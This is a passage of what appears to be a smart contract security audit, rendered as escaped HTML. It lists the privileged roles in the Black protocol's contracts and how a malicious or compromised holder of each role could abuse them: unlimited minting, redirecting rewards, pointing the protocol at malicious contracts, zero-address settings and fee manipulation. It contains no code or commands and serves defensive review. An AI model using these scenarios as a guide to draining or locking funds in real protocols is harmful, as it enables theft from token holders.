9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRoles/Actors in the system\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003eContract\u003c/th\u003e\n\u003cth\u003eRoles/Actors\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e1.\u003c/td\u003e\n\u003ctd\u003eBlack.sol\u003c/td\u003e\n\u003ctd\u003eMinter\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2.\u003c/td\u003e\n\u003ctd\u003eBlackClaims.sol\u003c/td\u003e\n\u003ctd\u003eOwner/Second Owner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e3.\u003c/td\u003e\n\u003ctd\u003eBlackGovernor.sol\u003c/td\u003e\n\u003ctd\u003e- Minter\u003cbr\u003e - Team\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e4.\u003c/td\u003e\n\u003ctd\u003eBribes.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e- Voter\u003cbr\u003e- GaugeManager\u003cbr\u003e- Minter\u003cbr\u003e- Avm\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e5.\u003c/td\u003e\n\u003ctd\u003eCustomPoolDeployer.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e - Authorized\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e6.\u003c/td\u003e\n\u003ctd\u003eCustomToken.sol\u003c/td\u003e\n\u003ctd\u003eOwner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e7.\u003c/td\u003e\n\u003ctd\u003eFan.sol\u003c/td\u003e\n\u003ctd\u003eOwner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e8.\u003c/td\u003e\n\u003ctd\u003eGaugeExtraRewarder.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e - GAUGE\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e9.\u003c/td\u003e\n\u003ctd\u003eGaugeManager.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e- GaugeAdmin\u003cbr\u003e- Governance\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e10.\u003c/td\u003e\n\u003ctd\u003eGaugeV2.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e- genesisManager\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e11.\u003c/td\u003e\n\u003ctd\u003eGenesisPool.sol\u003c/td\u003e\n\u003ctd\u003e- genesisManager\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e12.\u003c/td\u003e\n\u003ctd\u003eGenesisPoolManager.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e- Governance\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e13.\u003c/td\u003e\n\u003ctd\u003eMinterUpgradable.sol\u003c/td\u003e\n\u003ctd\u003eTeam\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e14.\u003c/td\u003e\n\u003ctd\u003ePermissionsRegistry.sol\u003c/td\u003e\n\u003ctd\u003eblackMultisig\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e15.\u003c/td\u003e\n\u003ctd\u003eRewardsDistributor.sol\u003c/td\u003e\n\u003ctd\u003eOwner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e16.\u003c/td\u003e\n\u003ctd\u003eRouterV2.sol\u003c/td\u003e\n\u003ctd\u003eOwner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e17.\u003c/td\u003e\n\u003ctd\u003eSetterTopNPoolsStrategy.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e - Executor\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e18.\u003c/td\u003e\n\u003ctd\u003eThenian.sol\u003c/td\u003e\n\u003ctd\u003eOwner\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e19.\u003c/td\u003e\n\u003ctd\u003eTokenHandler.sol\u003c/td\u003e\n\u003ctd\u003e- Governance\u003cbr\u003e - GenesisManager\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e20.\u003c/td\u003e\n\u003ctd\u003eVoterV3.sol\u003c/td\u003e\n\u003ctd\u003e- Owner\u003cbr\u003e- VoterAdmin\u003cbr\u003e- Governance\u003cbr\u003e- GenesisManager\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e21.\u003c/td\u003e\n\u003ctd\u003eVotingEscrow.sol\u003c/td\u003e\n\u003ctd\u003e- Voter\u003cbr\u003e- Team\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"powers-of-each-role-along-with-their-risks\" style=\"position:relative;\"\u003e\u003ca href=\"#powers-of-each-role-along-with-their-risks\" aria-label=\"powers of each role along with their risks permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003ePowers of each role (along with their risks)\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e1. In the Black.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMinter:\u003c/strong\u003e The minter role in the Black token contract holds critical authority over the token’s supply lifecycle. Initially assigned to the contract deployer, the minter can perform a one-time \u003ccode\u003einitialMint()\u003c/code\u003e of 50 million tokens to any specified address, as well as mint arbitrary token amounts at any point via the \u003ccode\u003emint()\u003c/code\u003e function. This role can also be reassigned to another address using the \u003ccode\u003esetMinter()\u003c/code\u003e function. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eInflation attack: The minter can call \u003ccode\u003emint\u003c/code\u003e (address, amount) to mint unlimited new tokens to any address. This would inflate the total supply, devalue user holdings.\u003c/li\u003e\n\u003cli\u003eMint and dump attack: The minter could mint large amounts of tokens to their own address and immediately dump them on the market.This would crash the token price and exploit unsuspecting holders.\u003c/li\u003e\n\u003cli\u003eSecretly mint tokens to their own account:  If this role is misused or compromised, the minter could secretly mint large amounts of BLACK tokens to their own address.\u003c/li\u003e\n\u003cli\u003ePermanently lose the minter role: The \u003ccode\u003esetMinter()\u003c/code\u003e function currently does not have an \u003ccode\u003eaddress(0)\u003c/code\u003e check , this can lead to the minter to set the new minter’s address as \u003ccode\u003e0x0\u003c/code\u003e. Hence, permanently losing the minter role. This would lead to the protocol to redeploy contracts again.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e2. In the BlackClaims.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner/Second Owner:\u003c/strong\u003e The owner has the ability to recoverERC20 tokens, set treasury, start a season, \u003ccode\u003erevokeUnclaimedReward\u003c/code\u003e, finalize a season, \u003ccode\u003eextendClaimDuration\u003c/code\u003e, report rewards and renounce ownership. This contract allows two owners to handle these functionalities. Here’s how any one of them or potentially both misuse their powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eOne owner can renounce ownership of the other: However, a potential security risk arises if one of the owner’s private keys is compromised. In such a scenario, the malicious actor could use the compromised key to call the \u003ccode\u003esetOwner2()\u003c/code\u003e function and change the second owner’s address to one under their control. This effectively grants full control to the attacker, bypassing the intended dual-ownership security model.\u003c/li\u003e\n\u003cli\u003eMay not ever recoverERC20 tokens: A malicious owner can just not call the \u003ccode\u003erecoverERC20()\u003c/code\u003e function, having the tokens locked in BlackClaims contract forever.\u003c/li\u003e\n\u003cli\u003eSet treasury’s address to himself/or to an \u003ccode\u003eaddress(0x0)\u003c/code\u003e: The owner can claim all the unclaimed rewards of the season, and potentially send it to “his” treasury address, Moreover, the \u003ccode\u003esetTreasury()\u003c/code\u003e function lacks an \u003ccode\u003eaddress(0x0)\u003c/code\u003e check, the malicious owner can potentially set an treasury to \u003ccode\u003eaddress(0x0)\u003c/code\u003e and call the \u003ccode\u003erevokeUnclaimedReward()\u003c/code\u003e function which will lead to the tokens to be permanently locked/lost.\u003c/li\u003e\n\u003cli\u003eSet the start time of a Season very high: The \u003ccode\u003estartSeason()\u003c/code\u003e function allows the owner to set the start time of a reward season without any upper limit or sanity check on the provided timestamp. A malicious or compromised owner could abuse this by setting the start time far into the future (e.g., 100 years ahead), effectively preventing the season from ever beginning.\u003c/li\u003e\n\u003cli\u003eSet treasury to \u003ccode\u003eaddress(0x0)\u003c/code\u003e and call \u003ccode\u003erevokeUnclaimedReward()\u003c/code\u003e: The malicious or compromised owner can call set the treasury to \u003ccode\u003eaddress(0x0)\u003c/code\u003e and then call the \u003ccode\u003erevokeUnclaimedReward()\u003c/code\u003e function, permanently loosing the funds.\u003c/li\u003e\n\u003cli\u003eNever finalize a season: The finalize function already holds solid checks; however, there can still be a misuse of a owner to never potentially finalize a season.\u003c/li\u003e\n\u003cli\u003eExtend claim duration to so high that the season never finalizes: The \u003ccode\u003eextendClaimDuration()\u003c/code\u003e function lacks checks to see if the claim duration amount is in bounds or not, the malicious or compromised owner can extend the claim duration to so high that finalization of a season will be impossible. Even if the compromised owner key is retained back to its original owner there is nothing that can be done.\u003c/li\u003e\n\u003cli\u003eRisk of reward censorship: The \u003ccode\u003ereportRewards()\u003c/code\u003e function only updates the rewards for the addresses explicitly passed in, a malicious or biased owner could intentionally omit certain players from the \u003ccode\u003eplayers_\u003c/code\u003e array. As a result, those omitted players would not receive their rightful rewards, even if they earned them during the season. This introduces a risk of reward censorship.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e3. In the In the BlackGovernor.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eMinter:\u003c/strong\u003e The Minter role in the BlackGovernor contract is a role assigned to a smart contract. Since the role is assigned to a contract (predefined methods), no governance manipulation may be possible for this role.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTeam:\u003c/strong\u003e The team role has the ability to set a proposal numerator and renounce its ownership to someone else. Here’s how a user with a team role can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet proposal numerator to zero: The malicious or compromised user with team role can set the proposal numerator to zero, potentially allowing anyone to propose even with 0 votes.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e4. In the Bribes.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e In the Bribes contract, the owner has the ability to set a new Voting, GaugeManager, AVM addresses. He also has the power over \u003ccode\u003erecoverERC20AndUpdateData()\u003c/code\u003e and \u003ccode\u003eemergencyRecoverERC20()\u003c/code\u003e functions. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet malicious contracts: The owner can assign malicious contract addresses for the voter, \u003ccode\u003egaugeManager\u003c/code\u003e, \u003ccode\u003ebribeFactory\u003c/code\u003e, or AVM; such that it benefits him, enabling backdoors or unauthorized control. These contracts could be programmed to redirect fees, manipulate votes, or extract value from user interactions — disguised as legitimate protocol behavior, but actually benefiting the malicious owner.\u003c/li\u003e\n\u003cli\u003eSteal rewards in the guise of recovery: The \u003ccode\u003eonlyAllowed\u003c/code\u003e role can invoke this function to withdraw arbitrary ERC20 tokens from the contract. They could manipulate reward accounting by subtracting \u003ccode\u003etokenAmount\u003c/code\u003e from the \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e, under-reporting actual rewards. This allows them to steal reward withdraw tokens meant for user rewards under the guise of “recovery”. Potentially few, or many users, might not receive their rewards, as it has been taken by the owner by the guise of recovery.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVoter:\u003c/strong\u003e No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGaugeManager:\u003c/strong\u003e No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMinter:\u003c/strong\u003e No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAvm\u003c/strong\u003e: No governance manipulation possible for this role since its a smart contract (predefined methods), unless the owner sets a malicious address (contract).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e5. In the CustomPoolDeployer.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to \u003ccode\u003eaddAuthorizedAccount\u003c/code\u003e, \u003ccode\u003eremoveAuthorizedAccount\u003c/code\u003e, \u003ccode\u003esetPluginForPool\u003c/code\u003e, \u003ccode\u003esetPlugin\u003c/code\u003e, \u003ccode\u003esetPluginConfig\u003c/code\u003e, \u003ccode\u003esetFee\u003c/code\u003e, \u003ccode\u003esetCommunityFee\u003c/code\u003e, \u003ccode\u003esetAlgebraFeeRecipient\u003c/code\u003e, \u003ccode\u003esetAlgebraFeeManager\u003c/code\u003e, \u003ccode\u003esetAlgebraFeeShare\u003c/code\u003e, \u003ccode\u003esetAlgebraFarmingProxyPluginFactory\u003c/code\u003e, \u003ccode\u003esetAlgebraFactory\u003c/code\u003e, \u003ccode\u003esetAlgebraPluginFactory\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eBackdoor privilege escalation via \u003ccode\u003eaddAuthorizedAccount\u003c/code\u003e: The owner can maliciously add multiple alternate EOA addresses or smart contracts as authorized accounts, effectively creating hidden backdoors for retaining control. These authorized entities could automate harmful actions such as setting high fees, bypassing restrictions, or manipulating internal state. Even after ownership is transferred, the previous owner may still retain access through these accounts and manipulate functions which are still accessible to the authorized accounts. While a \u003ccode\u003eremoveAuthorizedAccount\u003c/code\u003e function exists, the cleanup burden falls entirely on the new owner, who must manually revoke each account — a tedious process if many were pre-added.\u003c/li\u003e\n\u003cli\u003eFee manipulation via \u003ccode\u003esetFee()\u003c/code\u003e: A malicious owner can exploit the \u003ccode\u003esetFee()\u003c/code\u003e function to assign excessively high fees to a pool. This would result in an unfairly large portion of each user transaction being taken as fees, effectively discouraging usage, draining user value.\u003c/li\u003e\n\u003cli\u003eDeploy and set malicious factories: The owner could deploy malicious versions of these factories that generate contracts with backdoors or vulnerabilities. For example: farming Plugin Factory could redirect user rewards to the owner’s address, Algebra Factory could deploy pools with manipulated fee logic or ownership traps, Plugin Factory could enable unauthorized access or data leakage.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAuthorized:\u003c/strong\u003e The Authorized role has the ability to \u003ccode\u003esetPluginForPool\u003c/code\u003e, \u003ccode\u003esetPlugin\u003c/code\u003e, \u003ccode\u003esetPluginConfig\u003c/code\u003e, \u003ccode\u003esetFee\u003c/code\u003e, \u003ccode\u003esetCommunityFee\u003c/code\u003e. Here’s how a user with a Authorized role can misuse his power:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet high community fees: The protocol does not implement a cap on fees, allowing the malicious or compromised authorized role to set high fees. This does not pose much risk since the owner can just take away the authorized role from the user and set the fees properly again. However, if the owner is malicious or compromised then it’s a different scenario.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e6. In the CustomToken.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to mint and burn tokens from an account, Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMint a large sum: The owner can mint a large sum into a random account to inflate the value of the token. He can even mint tokens to his personal account to have more value.\u003c/li\u003e\n\u003cli\u003eBurn a large sum: The owner can exploit the mint and burn functions to manipulate token supply and market value. For example, the owner could burn a significant number of tokens from user accounts to reduce total supply, artificially inflating the token’s value. Simultaneously, the owner could mint a large number of tokens to their own account, allowing them to benefit from the deflationary effect they induced.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e7. In the Fan.sol contract\u003c/strong\u003e - \u003cem\u003eNote: Same as CustomToken contract (see number 6 above.)\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e8. In the GaugeExtraRewarder.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to \u003ccode\u003erecoverERC20\u003c/code\u003e and \u003ccode\u003esetDistributionRate\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet an extremely low amount in \u003ccode\u003esetDistributionRate\u003c/code\u003e: A compromised or malicious owner can deliberately set the reward amount very low, causing the distribution rate to slow down significantly and resulting in reduced rewards that may frustrate or disincentivize users.\u003c/li\u003e\n\u003cli\u003eBreak reward mechanism: The owner can call \u003ccode\u003erecoverERC20\u003c/code\u003e to withdraw any ERC20 token held by the contract, including the \u003ccode\u003erewardToken\u003c/code\u003e. Even though there is a check to limit withdrawal of the \u003ccode\u003erewardToken\u003c/code\u003e to the not-yet-distributed amount, the owner can still  withdraw tokens that users expect as rewards; with potential to reduce or disrupt user rewards by withdrawing tokens from the contract.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGAUGE:\u003c/strong\u003e No governance manipulation possible for this role since its a smart contract (predefined methods).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e9. In the GaugeManager.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to set the Avm address. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet a malicious contract to benefit himself: A compromised or  malicious Owner sets avm to a contract that looks like a voting escrow manager but has hidden backdoors. This malicious AVM could potentially divert locked tokens to the owner.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGaugeAdmin:\u003c/strong\u003e The GaugeAdmin has the ability to \u003ccode\u003esetBribeFactory\u003c/code\u003e, \u003ccode\u003esetPermissionsRegistry\u003c/code\u003e, \u003ccode\u003esetVoter\u003c/code\u003e, \u003ccode\u003esetGenesisManager\u003c/code\u003e, \u003ccode\u003esetBlackGovernor\u003c/code\u003e, \u003ccode\u003esetFarmingParam\u003c/code\u003e, \u003ccode\u003esetNewBribes\u003c/code\u003e, \u003ccode\u003esetInternalBribeFor\u003c/code\u003e, \u003ccode\u003esetExternalBribeFor\u003c/code\u003e, \u003ccode\u003esetMinter\u003c/code\u003e, \u003ccode\u003eaddGaugeFactory\u003c/code\u003e, \u003ccode\u003ereplaceGaugeFactory\u003c/code\u003e, \u003ccode\u003eremoveGaugeFactory\u003c/code\u003e, \u003ccode\u003eaddPairFactory\u003c/code\u003e, \u003ccode\u003ereplacePairFactory\u003c/code\u003e, \u003ccode\u003eremovePairFactory\u003c/code\u003e, \u003ccode\u003eacceptAlgebraFeeChangeProposal\u003c/code\u003e. Here’s how he can misuse his power:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMisuse critical functions: A malicious or compromised admin, having exclusive access to these functions, can misuse their powers by arbitrarily setting or replacing critical contract components such as the minter, gauge factories, and pair factories, which control key protocol behaviors like minting and gauge creation. By setting a malicious minter or injecting compromised factories, the admin could mint unlimited tokens, manipulate liquidity incentives, or redirect funds. Furthermore, the admin can unilaterally accept fee changes on Algebra pools, potentially increasing fees or redirecting revenue without community consent.\u003c/li\u003e\n\u003cli\u003eArbitrarily change addresses: They can arbitrarily change the addresses of key farming contracts (\u003ccode\u003efarmingCenter\u003c/code\u003e, \u003ccode\u003ealgebraEternalFarming\u003c/code\u003e, \u003ccode\u003enfpm\u003c/code\u003e), potentially redirecting farming rewards or incentives to malicious contracts. Additionally, by setting or replacing internal and external bribes on any gauge, the admin can manipulate voting incentives and reward distributions, possibly favoring certain participants or contracts unfairly. Since these settings directly influence how rewards and incentives flow within the protocol, the admin’s unchecked ability to alter them creates a significant risk of abuse, including funneling rewards to themselves or collaborators, destabilizing the ecosystem, and undermining user trust.\u003c/li\u003e\n\u003cli\u003eAdmin replaces the Bribe Factory and Permission Registry with malicious contracts: The admin, having full control, sets the \u003ccode\u003ebribefactory\u003c/code\u003e to a malicious contract they control. This fake bribe factory redirects all bribe rewards intended for legitimate liquidity providers or voters to the admin’s own address. Meanwhile, the admin also replaces the \u003ccode\u003epermissionRegistry\u003c/code\u003e with a contract that falsely approves only their own addresses or bots for privileged actions, effectively locking out honest participants. With the voter contract replaced by one that the admin controls, they can manipulate governance votes or decisions, passing proposals that benefit themselves or their allies, like lowering fees or minting tokens unfairly. At the same time, the admin sets \u003ccode\u003eblackGovernor\u003c/code\u003e to their own address, giving them the power to block or censor any proposals or actions from other users, consolidating full control over governance.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGovernance:\u003c/strong\u003e The governance role has the ability to revive and kill a gauge. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eKill gauges with malicious intent: A malicious governance actor can intentionally kill legitimate gauges under the pretense that they are “malicious”, using the \u003ccode\u003ekillGauge\u003c/code\u003e function. Since there is no on-chain validation of malicious behavior in the function itself, just a check that \u003ccode\u003eisAlive[_gauge]\u003c/code\u003e is true—they can arbitrarily target any active gauge.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e10. In the GaugeV2.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to \u003ccode\u003esetDistribution\u003c/code\u003e, \u003ccode\u003esetGaugeRewarder\u003c/code\u003e, \u003ccode\u003esetInternalBribe\u003c/code\u003e, \u003ccode\u003eactivateEmergencyMode\u003c/code\u003e, \u003ccode\u003estopEmergencyMode\u003c/code\u003e and \u003ccode\u003esetGenesisPoolManager\u003c/code\u003e. Here’s how he can misuse his powers;\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA malicious owner could stealthily redirect critical reward and bribe flows to attacker-controlled contracts by setting the internal bribe, gauge rewarder, and distribution addresses to malicious contracts. They could also consolidate control by assigning the genesis pool manager to themselves or colluding contracts, gaining influence over early-stage pools and rewards. Additionally, the owner can arbitrarily trigger and stop emergency mode, halting or manipulating protocol operations to stall users while executing self-serving upgrades or migrations. This unchecked power enables fund diversion, governance capture, loss of user trust, and backdoor control of key system parameters without any DAO or governance oversight, posing severe risks to protocol integrity and participant fairness.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGenesisManager:\u003c/strong\u003e The GenesisManager has the ability to set pools, Here’s how he can misuse his power:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSetting as \u003ccode\u003eaddress(0)\u003c/code\u003e: A compromised or malicious owner can set the Genesis Pool Manager to the zero address (\u003ccode\u003eaddress(0)\u003c/code\u003e), as the \u003ccode\u003esetGenesisPoolManager()\u003c/code\u003e function lacks a validation check to prevent this. This could disable or break core protocol functionality that depends on the genesis manager.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e11. In the GenesisPool.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003egenesisManager:\u003c/strong\u003e The genesisManager has the ability to \u003ccode\u003esetGenesisPoolInfo\u003c/code\u003e, \u003ccode\u003erejectPool\u003c/code\u003e, \u003ccode\u003eapprovePool\u003c/code\u003e, \u003ccode\u003edepositToken\u003c/code\u003e, \u003ccode\u003etransferIncentives\u003c/code\u003e, \u003ccode\u003esetPoolStatus\u003c/code\u003e, \u003ccode\u003elaunch\u003c/code\u003e, \u003ccode\u003esetAuction\u003c/code\u003e, \u003ccode\u003esetMaturityTime\u003c/code\u003e and \u003ccode\u003esetStartTime\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSet arbitrary parameters: The manager can misuse their role in \u003ccode\u003esetGenesisPoolInfo\u003c/code\u003e by providing malicious or incorrect input values since the function lacks proper input validation checks on critical parameters such as \u003ccode\u003egenesisInfo\u003c/code\u003e, \u003ccode\u003eallocationInfo\u003c/code\u003e, and \u003ccode\u003eauction\u003c/code\u003e. This enables the manager to set arbitrary genesis configurations, manipulate token allocation amounts, or assign a malicious \u003ccode\u003eauction\u003c/code\u003e contract that could siphon funds or behave unfairly.\u003c/li\u003e\n\u003cli\u003eReject pools arbitrarily: The manager can call \u003ccode\u003erejectPool()\u003c/code\u003e to mark any pool as \u003ccode\u003eNOT_QUALIFIED\u003c/code\u003e prematurely, blocking legitimate pools from proceeding and unfairly refunding proposed native tokens, potentially disrupting or censoring projects.\u003c/li\u003e\n\u003cli\u003eApprove malicious or fake pools: Using \u003ccode\u003eapprovePool()\u003c/code\u003e, the manager can approve pools with fake or attacker-controlled pair addresses (\u003ccode\u003e_pairAddress\u003c/code\u003e), enabling front-running, rug pulls, or other malicious activities disguised as legitimate pools.\u003c/li\u003e\n\u003cli\u003eManipulate deposits: In \u003ccode\u003edepositToken()\u003c/code\u003e, the manager controls when deposits are accepted (by controlling \u003ccode\u003epoolStatus\u003c/code\u003e and \u003ccode\u003egenesisInfo.startTime\u003c/code\u003e) and can arbitrarily restrict or allow deposits, effectively censoring or favoring certain users.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetPoolStatus\u003c/code\u003e to any pools without secondary authorization: The genesisManager can randomly set any pool’s status to “NOT QUALIFIED”. The protocol should implement a secondary role to make sure all interactions of genesisManager are appropriate or not.\u003c/li\u003e\n\u003cli\u003eSet a very high maturity: A compromised or malicious genesisManager can set a very high maturity time, the protocol does not implement an check to ensure that the maturity time is in bounds or not, making this scenario possible.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e12. In the GenesisPoolManager.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e The owner has the ability to set a router. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe current implementation of the code is incorrect, it only allows \u003ccode\u003eaddress(0)\u003c/code\u003e to be passed via \u003ccode\u003esetRouter()\u003c/code\u003e function, already favors the compromised or malicious owner.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGovernance:\u003c/strong\u003e The Governance role has the ability to \u003ccode\u003ewhiteListUserAndToken\u003c/code\u003e, \u003ccode\u003edepositNativeToken\u003c/code\u003e, \u003ccode\u003erejectGenesisPool\u003c/code\u003e, 